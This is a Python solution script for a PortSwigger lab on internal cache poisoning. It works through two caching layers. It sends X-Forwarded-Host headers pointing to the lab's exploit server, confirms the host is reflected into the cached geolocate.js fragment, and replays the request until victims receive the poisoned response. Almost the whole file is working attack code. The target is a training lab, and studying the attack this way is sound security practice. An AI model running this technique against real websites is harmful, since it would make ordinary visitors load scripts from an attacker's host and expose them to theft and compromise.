"""
Lab 11: Internal cache poisoning
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal
Difficulty: Expert

📝 TWO layers of caching with DIFFERENT key rules: an external (CDN-style)
cache and an internal application-level cache that caches a narrower page
FRAGMENT (e.g. a geolocation widget's script tag) with its own, more
permissive key. Bypass the external layer with a cache-buster, discover
the internal layer still caches your payload even WITH that buster present
(since the buster is unkeyed by the inner layer too), then poison that
inner fragment directly.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    s = get_session()

    note("Step 1: confirm Host-style header IS keyed by the EXTERNAL cache")
    note("(bypass it with a cache-buster query param each time initially).")
    r = s.get(f"{TARGET}/?cb=12345", headers={"X-Forwarded-Host": EXPLOIT_HOST})
    log(f"Reflected (possibly 3x — canonical link, analytics.js, geolocate.js): "
        f"{EXPLOIT_HOST in r.text}")

    note("Step 2: repeat several times. Expect the canonical link + analytics.js")
    note("URL to update to the exploit host relatively quickly (external")
    note("cache layer), but geolocate.js to lag behind or not update at all —")
    note("that's the INTERNAL cache serving a separately-cached fragment.")

    for i in range(5):
        r = s.get(f"{TARGET}/?cb=12345", headers={"X-Forwarded-Host": EXPLOIT_HOST})
        geolocate_poisoned = "geolocate.js" in r.text and EXPLOIT_HOST in r.text
        log(f"Attempt {i + 1}: geolocate.js poisoned yet: {geolocate_poisoned}")
        if geolocate_poisoned:
            break

    note("Step 3: once the internal fragment shows poisoned EVEN WITH the")
    note("cache-buster present, that confirms the inner cache ignores the")
    note("query string entirely — keep replaying (buster optional at this")
    note("point) until the victim loads the page and the lab solves.")

    r = poison_until_hit(s, f"{TARGET}/", headers={"X-Forwarded-Host": EXPLOIT_HOST})
    if r:
        log(f"Final poisoned check — exploit host present: {EXPLOIT_HOST in r.text}")


if __name__ == "__main__":
    run()
